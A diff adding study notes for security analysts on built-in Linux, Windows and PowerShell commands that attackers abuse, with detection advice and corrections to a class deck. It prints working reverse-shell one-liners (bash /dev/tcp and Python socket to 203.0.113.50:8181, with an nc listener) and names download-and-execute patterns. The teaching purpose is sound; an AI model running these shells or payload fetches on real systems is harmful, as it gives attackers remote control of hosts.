@@ -371,6 +371,40 @@ dict(id="pattern-commands", o="1.3", t="Pattern recognition and suspicious comma
 <tr><td><code>wget|curl ... | sh</code>, <code>chmod +x /tmp/x</code></td><td>Download and execute on Linux</td></tr></table></div>
 <p>Using built-in tools like these is called <strong>living off the land</strong>: nothing new is installed, so signature AV misses it, and behavior (EDR) and command-line logging (Event ID 4688 with command line, PowerShell Script Block Logging 4104) catch it.</p>
 <p><strong>Local recon commands</strong> on a live host: <code>netstat -ano</code> (connections with owning PID), <code>tasklist /svc</code>, <code>ipconfig /displaydns</code> (resolver cache), <code>ps aux</code>, <code>ss -tulpn</code> or <code>lsof -i</code> on Linux.</p>
+<p><strong>Built-in commands attackers lean on.</strong> None of these is malicious by itself. What matters is who ran it, when, from which parent process, and where it connected. A SIEM only sees them if command-line logging is on.</p>
+<div class="tblwrap"><table><tr><th>Linux</th><th>Normal use</th><th>Why it shows up in attacks</th></tr>
+<tr><td><code>ssh</code></td><td>Remote administration</td><td>Lateral movement with stolen keys; <code>-L</code>, <code>-R</code> and <code>-D</code> build tunnels past firewalls</td></tr>
+<tr><td><code>wget</code>, <code>curl</code></td><td>Fetch a file or page</td><td>Pull a payload; <code>curl -d</code> or <code>-T</code> also pushes data out</td></tr>
+<tr><td><code>telnet</code>, <code>ftp</code></td><td>Legacy remote access and file transfer</td><td>Cleartext credentials; <code>telnet host port</code> doubles as a quick port check</td></tr>
+<tr><td><code>ip neigh</code>, <code>arp -n</code></td><td>Neighbor (ARP) table: IP to MAC</td><td>Map the hosts on the local subnet</td></tr>
+<tr><td><code>ip a</code>, <code>ifconfig</code></td><td>Interface addresses</td><td>Learn which networks the host can reach</td></tr>
+<tr><td><code>ss -tunap</code>, <code>netstat -tunap</code></td><td>Sockets and owning processes</td><td>Find listening services; spot a shell holding a network socket</td></tr>
+<tr><td><code>whoami</code>, <code>id</code></td><td>Current user and groups</td><td>Usually the first command after landing: what privileges do I have?</td></tr></table></div>
+<div class="tblwrap"><table><tr><th>Windows</th><th>Normal use</th><th>Why it shows up in attacks</th></tr>
+<tr><td><code>netstat -ano</code></td><td>Connections with owning PID</td><td>Recon, and checking the attacker&rsquo;s own C2 session</td></tr>
+<tr><td><code>ping</code></td><td>Connectivity test</td><td>Host sweeps; ICMP payloads can carry data out (ICMP tunneling)</td></tr>
+<tr><td><code>ipconfig /all</code></td><td>Addressing, DNS servers, domain</td><td>Recon of the network and domain</td></tr>
+<tr><td><code>nslookup</code></td><td>DNS lookups</td><td>Find domain controllers (<code>_ldap._tcp</code> SRV records); TXT lookups for C2</td></tr>
+<tr><td><code>tasklist</code></td><td>Running processes</td><td>Find antivirus or EDR to stop</td></tr>
+<tr><td><code>net user</code>, <code>net group</code>, <code>net localgroup</code>, <code>net use</code></td><td>Accounts, groups, mapped shares</td><td>List domain admins, add an account, map admin shares</td></tr>
+<tr><td><code>netsh</code></td><td>Firewall, Wi-Fi and interface settings</td><td>Open firewall ports, forward ports (<code>netsh interface portproxy</code>), show saved Wi-Fi keys (<code>key=clear</code>)</td></tr></table></div>
+<div class="tblwrap"><table><tr><th>PowerShell</th><th>Normal use</th><th>Why it shows up in attacks</th></tr>
+<tr><td><code>Invoke-WebRequest</code> (aliases <code>iwr</code>, <code>wget</code>, <code>curl</code>)</td><td>HTTP or HTTPS request</td><td>Download a payload or send data out</td></tr>
+<tr><td><code>(New-Object Net.WebClient).DownloadString()</code></td><td>Fetch text from a URL</td><td>Pull a script straight into memory</td></tr>
+<tr><td><code>Invoke-Expression</code> (<code>IEX</code>)</td><td>Run a string as code</td><td>Executes that downloaded script; nothing touches disk</td></tr>
+<tr><td><code>Invoke-Command</code></td><td>Run commands on remote computers over WinRM</td><td>Lateral movement</td></tr>
+<tr><td><code>Start-Process</code></td><td>Launch a program</td><td>Start a payload, often with <code>-WindowStyle Hidden</code> or <code>-Verb RunAs</code></td></tr>
+<tr><td><code>Get-WmiObject</code>, <code>Get-CimInstance</code></td><td>Query WMI</td><td>Host recon (installed antivirus, patches); WMI also runs remote commands and persistence</td></tr>
+<tr><td><code>Get-Process</code></td><td>List processes</td><td>Find security tools to stop</td></tr></table></div>
+<p><strong>Reverse shells.</strong> The victim connects <em>out</em> to the attacker, so the inbound firewall never sees a new connection. That is why they are popular, and why even a failed attempt is an incident: someone already had code running.</p>
+<pre><code># attacker: listener (-l listen, -v verbose, -n no DNS, -p port)
+nc -lvnp 8181
+# victim: bash
+bash -i &gt;&amp; /dev/tcp/203.0.113.50/8181 0&gt;&amp;1
+# victim: python
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.50",8181));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'</code></pre>
+<p>What to look for: a shell (<code>bash</code>, <code>sh</code>, <code>cmd.exe</code>, <code>powershell.exe</code>) that owns an established network socket (<code>ss -tnp</code> shows the process name); a web server or database process starting a shell; a server making an outbound connection to an unusual high port.</p>
+<blockquote><span class="tag">Class deck check</span>The Day 13 command table pairs <code>arp</code> and <code>ss</code> as tools for physical addresses. Only <code>arp</code> (or <code>ip neigh</code>) shows MAC addresses; <code>ss</code> lists sockets: ports, connections and the processes that own them. The PowerShell table lists <code>Invoke-Request</code>, which is not a cmdlet: remote commands use <code>Invoke-Command</code>, web requests use <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code>. Day 14 labels <code>netstat -at</code> as listening ports; <code>-a</code> shows all sockets, and listening only is <code>netstat -lt</code> (or <code>ss -lt</code>).</blockquote>
 """),
 
 dict(id="email-analysis", o="1.3", t="Email analysis: headers, SPF, DKIM, DMARC, links", q="dmarc", h="""
